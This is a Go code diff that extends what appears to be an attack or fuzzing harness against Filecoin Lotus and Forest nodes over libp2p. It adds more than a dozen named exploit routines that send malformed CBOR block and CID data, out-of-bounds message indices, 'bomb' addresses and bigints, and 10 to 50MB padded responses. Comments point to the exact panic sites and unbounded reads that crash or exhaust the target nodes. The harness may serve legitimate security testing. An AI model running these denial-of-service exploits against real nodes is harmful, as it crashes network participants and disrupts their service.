@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bytes"
 	"context"
 	"io"
 	"log"
@@ -10,6 +11,7 @@ import (
 	"github.com/libp2p/go-libp2p/core/host"
 	"github.com/libp2p/go-libp2p/core/network"
 	"github.com/libp2p/go-libp2p/core/peer"
+	cbg "github.com/whyrusleeping/cbor-gen"
 )
 
 // ---------------------------------------------------------------------------
@@ -29,43 +31,82 @@ type responseMutation struct {
 }
 
 func getAllExchangeServerAttacks() []namedAttack {
-	// Server-side attacks only — these hit paths WITHOUT recover().
-	// Removed client-side multiblock mutations (nil-ticket, both-nil-tickets,
-	// nil-electionproof) since they all hit the known recover() at
-	// exchange/client.go:167.
-	var result []namedAttack
-
-	result = append(result,
-		namedAttack{
-			name: "exchange/poison-block-duplicate-cid",
-			fn: func() {
-				target := rngChoice(targets)
-				runPoisonBlockReuse(ctx, target)
-			},
+	attacks := []namedAttack{
+		{
+			name:       "exchange/all-response-with-duplicate-block-cid",
+			targetedFn: func(t TargetNode) { runPoisonBlockReuse(ctx, t) },
+			targetType: nodeAny,
 		},
-		namedAttack{
-			name: "exchange/nil-secpk-message",
-			fn: func() {
-				target := rngChoice(targets)
-				runSplitFetchNilSecpk(ctx, target)
-			},
+		{
+			name:       "exchange/all-response-with-nil-secpk-message",
+			targetedFn: func(t TargetNode) { runSplitFetchNilSecpk(ctx, t) },
+			targetType: nodeAny,
 		},
-		namedAttack{
-			name: "exchange/random-nil-fields",
-			fn: func() {
-				target := rngChoice(targets)
-				runRandomNilFields(ctx, target)
-			},
+		{
+			name:       "exchange/all-response-with-random-nil-block-fields",
+			targetedFn: func(t TargetNode) { runRandomNilFields(ctx, t) },
+			targetType: nodeAny,
 		},
-		namedAttack{
-			name: "exchange/oversized-response-oom",
-			fn: func() {
-				target := rngChoice(targets)
-				runOversizedResponse(ctx, target)
-			},
+		{
+			name:       "exchange/forest-response-with-10mb-padding",
+			targetedFn: func(t TargetNode) { runOversizedResponse(ctx, t) },
+			targetType: nodeForest, // only Forest has unbounded read_to_end
 		},
-	)
-	return result
+		// New vectors
+		{
+			name:       "exchange/all-block-with-malformed-parent-cids",
+			targetedFn: func(t TargetNode) { runMalformedParentCIDs(ctx, t) },
+			targetType: nodeAny,
+		},
+		{
+			name:       "exchange/forest-response-with-50mb-padding",
+			targetedFn: func(t TargetNode) { runLargeOversizedResponse(ctx, t) },
+			targetType: nodeForest, // Forest unbounded read_to_end
+		},
+		{
+			name:       "exchange/lotus-request-with-malformed-head-cids",
+			targetedFn: func(t TargetNode) { runMalformedRequestCIDs(ctx, t) },
+			targetType: nodeLotus,
+		},
+		// Deep corruption vectors
+		{
+			name:       "exchange/all-block-message-with-bad-address",
+			targetedFn: func(t TargetNode) { runBombAddrInMessages(ctx, t) },
+			targetType: nodeAny,
+		},
+		{
+			name:       "exchange/all-block-message-with-bad-bigint",
+			targetedFn: func(t TargetNode) { runBombBigIntInMessages(ctx, t) },
+			targetType: nodeAny,
+		},
+		{
+			name:       "exchange/all-response-with-out-of-bounds-message-indices",
+			targetedFn: func(t TargetNode) { runMismatchedIncludes(ctx, t) },
+			targetType: nodeAny,
+		},
+		{
+			name:       "exchange/all-tipset-with-mismatched-block-parents",
+			targetedFn: func(t TargetNode) { runInconsistentTipsetParents(ctx, t) },
+			targetType: nodeAny,
+		},
+		{
+			name:       "exchange/all-ok-status-with-nil-chain",
+			targetedFn: func(t TargetNode) { runStatusOkNilChain(ctx, t) },
+			targetType: nodeAny,
+		},
+		{
+			name:       "exchange/all-tipset-with-zero-blocks",
+			targetedFn: func(t TargetNode) { runZeroLengthBlockArray(ctx, t) },
+			targetType: nodeAny,
+		},
+		{
+			name:       "exchange/forest-block-message-with-f4-delegated-address",
+			targetedFn: func(t TargetNode) { runBombAddrF4Forest(ctx, t) },
+			targetType: nodeForest,
+		},
+	}
+	attacks = append(attacks, getAllRoundTripExchangeAttacks()...)
+	return attacks
 }
 
 // runExchangeServerAttack executes a single server-side attack.
@@ -470,4 +511,381 @@ func runOversizedResponse(ctx context.Context, target TargetNode) {
 	case <-time.After(30 * time.Second):
 		debugLog("[exchange-oom] timeout on %s", target.Name)
 	}
+}
+
+// ---------------------------------------------------------------------------
+// Malformed parent CIDs attack (targets TipSetKey.Cids() panic)
+//
+// Serves a block with corrupted parent CID bytes. When the victim calls
+// TipSetKey.Cids() at tipset_key.go:65, it panics on invalid CID data.
+// ---------------------------------------------------------------------------
+
+func runMalformedParentCIDs(ctx context.Context, target TargetNode) {
+	headInfo := fetchChainHead(target.Name)
+	if headInfo == nil {
+		debugLog("[exchange-malformed-cids] cannot fetch chain head for %s", target.Name)
+		return
+	}
+
+	h, err := pool.GetFresh(ctx)
+	if err != nil {
+		log.Printf("[exchange-malformed-cids] create host failed: %v", err)
+		return
+	}
+	defer h.Close()
+
+	// Build a block with corrupted parent CID bytes
+	var malformedParents bytes.Buffer
+	cbg.WriteMajorTypeHeader(&malformedParents, cbg.MajArray, 1)
+	switch rngIntn(3) {
+	case 0: // Truncated CID: tag(42) + 2-byte bytestring
+		cbg.WriteMajorTypeHeader(&malformedParents, cbg.MajTag, 42)
+		cbg.WriteMajorTypeHeader(&malformedParents, cbg.MajByteString, 2)
+		malformedParents.Write([]byte{0x00, 0x01})
+	case 1: // CID with invalid multihash
+		cbg.WriteMajorTypeHeader(&malformedParents, cbg.MajTag, 42)
+		garbage := append([]byte{0x00}, randomBytes(5)...)
+		cbg.WriteMajorTypeHeader(&malformedParents, cbg.MajByteString, uint64(len(garbage)))
+		malformedParents.Write(garbage)
+	case 2: // Empty CID bytes
+		cbg.WriteMajorTypeHeader(&malformedParents, cbg.MajTag, 42)
+		cbg.WriteMajorTypeHeader(&malformedParents, cbg.MajByteString, 0)
+	}
+
+	fields := buildDefaultHeaderFields()
+	fields[5] = malformedParents.Bytes() // Parents
+	blockCBOR := cborArray(fields...)
+	blockCID := blockCIDFromCBOR(blockCBOR)
+
+	served := make(chan struct{}, 1)
+
+	h.SetStreamHandler(exchangeProtocol, func(s network.Stream) {
+		defer s.Close()
+		io.Copy(io.Discard, io.LimitReader(s, 64*1024))
+		s.Write(okResponse(buildBSTipSetCBOR([][]byte{blockCBOR}, buildEmptyCompactedMsgsCBOR())))
+		select {
+		case served <- struct{}{}:
+		default:
+		}
+	})
+
+	h.SetStreamHandler(helloProtocol, func(s network.Stream) {
+		io.Copy(io.Discard, io.LimitReader(s, 64*1024))
+		s.Write(cborArray(cborInt64(0), cborInt64(0)))
+		s.Close()
+	})
+
+	connectCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
+	defer cancel()
+	if err := h.Connect(connectCtx, target.AddrInfo); err != nil {
+		debugLog("[exchange-malformed-cids] connect failed: %v", err)
+		return
+	}
+
+	genesis := parseGenesisCID()
+	sendHelloPayload(ctx, h, target.AddrInfo.ID, buildHelloMessage(
+		[]cid.Cid{blockCID}, headInfo.Height+1, 999999999, genesis,
+	))
+
+	select {
+	case <-served:
+		log.Printf("[exchange-malformed-cids] served to %s", target.Name)
+	case <-time.After(15 * time.Second):
+		debugLog("[exchange-malformed-cids] timeout on %s", target.Name)
+	}
+}
+
+// ---------------------------------------------------------------------------
+// Large oversized response (50MB — Forest OOM via unbounded read_to_end)
+// ---------------------------------------------------------------------------
+
+func runLargeOversizedResponse(ctx context.Context, target TargetNode) {
+	headInfo := fetchChainHead(target.Name)
+	if headInfo == nil {
+		debugLog("[exchange-large-oom] cannot fetch chain head for %s", target.Name)
+		return
+	}
+
+	h, err := pool.GetFresh(ctx)
+	if err != nil {
+		log.Printf("[exchange-large-oom] create host failed: %v", err)
+		return
+	}
+	defer h.Close()
+
+	blockCBOR := buildBlockHeaderCBOR(blockHeaderOpts{
+		overrideParentCIDs: headInfo.CIDs,
+		overrideHeight:     headInfo.Height + 1,
+		overrideWeight:     999999999,
+	})
+	blockCID := blockCIDFromCBOR(blockCBOR)
+
+	served := make(chan struct{}, 1)
+
+	h.SetStreamHandler(exchangeProtocol, func(s network.Stream) {
+		defer s.Close()
+		io.Copy(io.Discard, io.LimitReader(s, 64*1024))
+
+		resp := okResponse(buildBSTipSetCBOR([][]byte{blockCBOR}, buildEmptyCompactedMsgsCBOR()))
+		padSize := 50 * 1024 * 1024 // 50MB
+		padded := make([]byte, len(resp)+padSize)
+		copy(padded, resp)
+		for i := len(resp); i < len(padded); i++ {
+			padded[i] = byte(i % 256)
+		}
+		s.Write(padded)
+		select {
+		case served <- struct{}{}:
+		default:
+		}
+	})
+
+	h.SetStreamHandler(helloProtocol, func(s network.Stream) {
+		io.Copy(io.Discard, io.LimitReader(s, 64*1024))
+		s.Write(cborArray(cborInt64(0), cborInt64(0)))
+		s.Close()
+	})
+
+	connectCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
+	defer cancel()
+	if err := h.Connect(connectCtx, target.AddrInfo); err != nil {
+		debugLog("[exchange-large-oom] connect to %s failed: %v", target.Name, err)
+		return
+	}
+
+	genesis := parseGenesisCID()
+	sendHelloPayload(ctx, h, target.AddrInfo.ID, buildHelloMessage(
+		[]cid.Cid{blockCID}, headInfo.Height+1, 999999999, genesis,
+	))
+
+	select {
+	case <-served:
+		log.Printf("[exchange-large-oom] 50MB response served to %s", target.Name)
+	case <-time.After(30 * time.Second):
+		debugLog("[exchange-large-oom] timeout on %s", target.Name)
+	}
+}
+
+// ---------------------------------------------------------------------------
+// Malformed request CIDs (targets Lotus server HandleStream — no recover)
+//
+// Sends a ChainExchange REQUEST with malformed CID bytes in the Head field.
+// Lotus's exchange/server.go:HandleStream has NO recover(). If cid.Cast()
+// panics on the malformed bytes, the server goroutine crashes.
+// ---------------------------------------------------------------------------
+
+func runMalformedRequestCIDs(ctx context.Context, target TargetNode) {
+	h, err := pool.GetFresh(ctx)
+	if err != nil {
+		log.Printf("[exchange-malformed-req] create host failed: %v", err)
+		return
+	}
+	defer h.Close()
+
+	connectCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
+	defer cancel()
+	if err := h.Connect(connectCtx, target.AddrInfo); err != nil {
+		debugLog("[exchange-malformed-req] connect failed: %v", err)
+		return
+	}
+
+	streamCtx, streamCancel := context.WithTimeout(ctx, 10*time.Second)
+	defer streamCancel()
+	s, err := h.NewStream(streamCtx, target.AddrInfo.ID, exchangeProtocol)
+	if err != nil {
+		debugLog("[exchange-malformed-req] stream failed: %v", err)
+		return
+	}
+	defer s.Close()
+
+	// Build a request with malformed CID bytes in the Head array
+	var malformedHead bytes.Buffer
+	cbg.WriteMajorTypeHeader(&malformedHead, cbg.MajArray, 1)
+	switch rngIntn(4) {
+	case 0: // Tag 42 + truncated byte string
+		cbg.WriteMajorTypeHeader(&malformedHead, cbg.MajTag, 42)
+		cbg.WriteMajorTypeHeader(&malformedHead, cbg.MajByteString, 2)
+		malformedHead.Write([]byte{0x00, 0xFF})
+	case 1: // Tag 42 + empty bytes
+		cbg.WriteMajorTypeHeader(&malformedHead, cbg.MajTag, 42)
+		cbg.WriteMajorTypeHeader(&malformedHead, cbg.MajByteString, 0)
+	case 2: // No tag, raw garbage bytes
+		cbg.WriteMajorTypeHeader(&malformedHead, cbg.MajByteString, 8)
+		malformedHead.Write(randomBytes(8))
+	case 3: // Tag 42 + invalid multihash (bad varint)
+		cbg.WriteMajorTypeHeader(&malformedHead, cbg.MajTag, 42)
+		garbage := []byte{0x00, 0x80, 0x80, 0x80, 0x80}
+		cbg.WriteMajorTypeHeader(&malformedHead, cbg.MajByteString, uint64(len(garbage)))
+		malformedHead.Write(garbage)
+	}
+
+	request := cborArray(malformedHead.Bytes(), cborUint64(1), cborUint64(3))
+	s.Write(request)
+	s.CloseWrite()
+
+	log.Printf("[exchange-malformed-req] sent malformed CID request to %s", target.Name)
+	s.SetReadDeadline(time.Now().Add(10 * time.Second))
+	io.Copy(io.Discard, io.LimitReader(s, 64*1024))
+}
+
+// ---------------------------------------------------------------------------
+// Deep corruption vectors
+// ---------------------------------------------------------------------------
+
+func exchangeServerHelper(ctx context.Context, target TargetNode, id string, respBuilder func(*chainHeadInfo) []byte) {
+	headInfo := fetchChainHead(target.Name)
+	if headInfo == nil {
+		return
+	}
+	resp := respBuilder(headInfo)
+	blockCBOR := buildBlockHeaderCBOR(blockHeaderOpts{
+		overrideParentCIDs: headInfo.CIDs,
+		overrideHeight:     headInfo.Height + 1,
+		overrideWeight:     999999999,
+	})
+	triggerCID := blockCIDFromCBOR(blockCBOR)
+
+	h, err := pool.GetFresh(ctx)
+	if err != nil {
+		return
+	}
+	defer h.Close()
+
+	served := make(chan struct{}, 1)
+	h.SetStreamHandler(exchangeProtocol, func(s network.Stream) {
+		defer s.Close()
+		io.Copy(io.Discard, io.LimitReader(s, 64*1024))
+		s.Write(resp)
+		select {
+		case served <- struct{}{}:
+		default:
+		}
+	})
+	h.SetStreamHandler(helloProtocol, func(s network.Stream) {
+		io.Copy(io.Discard, io.LimitReader(s, 64*1024))
+		s.Write(cborArray(cborInt64(0), cborInt64(0)))
+		s.Close()
+	})
+
+	connectCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
+	defer cancel()
+	if err := h.Connect(connectCtx, target.AddrInfo); err != nil {
+		return
+	}
+
+	genesis := parseGenesisCID()
+	sendHelloPayload(ctx, h, target.AddrInfo.ID, buildHelloMessage(
+		[]cid.Cid{triggerCID}, headInfo.Height+1, 999999999, genesis,
+	))
+
+	select {
+	case <-served:
+		log.Printf("[%s] served to %s", id, target.Name)
+	case <-time.After(15 * time.Second):
+		debugLog("[%s] timeout on %s", id, target.Name)
+	}
+}
+
+func runBombAddrInMessages(ctx context.Context, target TargetNode) {
+	exchangeServerHelper(ctx, target, "bomb-addr-msgs", func(head *chainHeadInfo) []byte {
+		addr := generateRoundTripBombAddress()
+		msgs := buildCompactedMsgsWithBombMsg(addr)
+		block := buildBlockHeaderCBOR(blockHeaderOpts{
+			overrideParentCIDs: head.CIDs,
+			overrideHeight:     head.Height + 1,
+			overrideWeight:     999999999,
+		})
+		return okResponse(buildBSTipSetCBOR([][]byte{block}, msgs))
+	})
+}
+
+func runBombBigIntInMessages(ctx context.Context, target TargetNode) {
+	exchangeServerHelper(ctx, target, "bomb-bigint-msgs", func(head *chainHeadInfo) []byte {
+		bombVal := generateRoundTripBombBigInt()
+		bombMsg := buildMessageCBORWithBigInt(bombVal)
+		msgs := cborArray(
+			cborArray(bombMsg),
+			cborArray(cborArray(cborUint64(0))),
+			cborArray(),
+			cborArray(cborArray()),
+		)
+		block := buildBlockHeaderCBOR(blockHeaderOpts{
+			overrideParentCIDs: head.CIDs,
+			overrideHeight:     head.Height + 1,
+			overrideWeight:     999999999,
+		})
+		return okResponse(buildBSTipSetCBOR([][]byte{block}, msgs))
+	})
+}
+
+func runMismatchedIncludes(ctx context.Context, target TargetNode) {
+	exchangeServerHelper(ctx, target, "mismatched-includes", func(head *chainHeadInfo) []byte {
+		// 2 blocks but BlsIncludes references block index 5 (OOB)
+		shared := newSharedBlockCIDs()
+		blockA := buildBlockHeaderCBOR(blockHeaderOpts{
+			overrideParentCIDs: head.CIDs,
+			overrideHeight:     head.Height + 1,
+			overrideWeight:     999999999,
+			overrideMiner:      []byte{0x00, 0xe8, 0x07},
+			overrideCIDs:       shared,
+		})
+		blockB := buildBlockHeaderCBOR(blockHeaderOpts{
+			overrideParentCIDs: head.CIDs,
+			overrideHeight:     head.Height + 1,
+			overrideWeight:     999999999,
+			overrideMiner:      []byte{0x00, 0xe9, 0x07},
+			overrideCIDs:       shared,
+		})
+		msgs := cborArray(
+			cborArray(),
+			cborArray(cborArray(cborUint64(5)), cborArray()), // OOB index 5 for block 0
+			cborArray(),
+			cborArray(cborArray(), cborArray()),
+		)
+		return okResponse(buildBSTipSetCBOR([][]byte{blockA, blockB}, msgs))
+	})
+}
+
+func runInconsistentTipsetParents(ctx context.Context, target TargetNode) {
+	exchangeServerHelper(ctx, target, "inconsistent-parents", func(head *chainHeadInfo) []byte {
+		// 2 blocks with different parents — should be rejected by NewTipSet
+		blockA := buildBlockHeaderCBOR(blockHeaderOpts{
+			overrideParentCIDs: head.CIDs,
+			overrideHeight:     head.Height + 1,
+			overrideWeight:     999999999,
+			overrideMiner:      []byte{0x00, 0xe8, 0x07},
+		})
+		blockB := buildBlockHeaderCBOR(blockHeaderOpts{
+			overrideHeight:  head.Height + 1,
+			overrideWeight:  999999999,
+			overrideMiner:   []byte{0x00, 0xe9, 0x07},
+			// No overrideParentCIDs → random parents (different from blockA)
+		})
+		return okResponse(buildBSTipSetCBOR([][]byte{blockA, blockB}, buildMultiBlockMsgsCBOR()))
+	})
+}
+
+func runStatusOkNilChain(ctx context.Context, target TargetNode) {
+	exchangeServerHelper(ctx, target, "status-ok-nil-chain", func(head *chainHeadInfo) []byte {
+		return buildResponseCBOR(0, "", nil) // status OK but no chain data
+	})
+}
+
+func runZeroLengthBlockArray(ctx context.Context, target TargetNode) {
+	exchangeServerHelper(ctx, target, "zero-blocks", func(head *chainHeadInfo) []byte {
+		return okResponse(buildBSTipSetCBOR([][]byte{}, buildEmptyCompactedMsgsCBOR()))
+	})
+}
+
+func runBombAddrF4Forest(ctx context.Context, target TargetNode) {
+	exchangeServerHelper(ctx, target, "bomb-f4-forest", func(head *chainHeadInfo) []byte {
+		addr := generateF4Address(10, 20)
+		msgs := buildCompactedMsgsWithBombMsg(addr)
+		block := buildBlockHeaderCBOR(blockHeaderOpts{
+			overrideParentCIDs: head.CIDs,
+			overrideHeight:     head.Height + 1,
+			overrideWeight:     999999999,
+		})
+		return okResponse(buildBSTipSetCBOR([][]byte{block}, msgs))
+	})
 }
